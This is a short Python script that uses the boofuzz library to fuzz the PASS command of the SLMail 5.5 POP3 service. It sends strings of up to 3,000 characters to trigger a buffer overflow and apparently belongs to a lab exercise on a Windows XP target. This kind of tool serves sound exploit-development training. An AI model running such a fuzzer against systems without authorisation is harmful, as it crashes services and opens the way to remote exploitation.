#!/usr/bin/env python3

import argparse
import ipaddress
import sys
from boofuzz import *


"""
Author: Pedro Flor
Date: 10/august/2019
Version: 1.0
"""


def verify_ip(ip_address):
    try:
        return ipaddress.IPv4Address(ip_address)
    except:
        print("ERROR: Invalid IP Address")
        sys.exit(0)


def fuzz_slmail_pop3(rhost, rport):

    session = Session(
        sleep_time=0,
        log_level=100,
        target=Target(connection=SocketConnection(str(rhost), rport, proto="tcp")),
    )

    s_initialize("user")
    s_static("USER test\r\n")

    s_initialize("pass")
    s_static("PASS")
    s_delim(" ", fuzzable=False)
    s_string("AAAA", max_len=3000)
    s_static("\r\n")

    session.connect(s_get("user"))
    session.connect(s_get("user"), s_get("pass"))

    session.fuzz()


if __name__ == "__main__":

    ### Arguments
    parser = argparse.ArgumentParser(description="_-=Fuzzer=-_")
    parser.add_argument(
        "-r", "--rhost", help="IP Remote Host", metavar="", required=True
    )
    parser.add_argument(
        "-p", "--rport", type=int, help="Remote Port", metavar="", required=True
    )
    args = parser.parse_args()

    ## IP validation
    rhost = verify_ip(args.rhost)
    rport = args.rport

    ## fuzzing
    fuzz_slmail_pop3(rhost, rport)


"""
TODO
====
1) Monitor the remote service to handle properly the fuzzing process.
2) Figure it out, why the script always gets a BoF from SLMAIL in the second run, never in the first.

How to use the script
=====================
a) Install "SLMAIL" on WinXP
   SMAIL Download: https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe
b) Run the script in you Linux box
   $ python3 ./fuzz_slmail_pop3.py -r <IP_Address_of_slmail_pop3_server> -p 110


NOTE:

"""
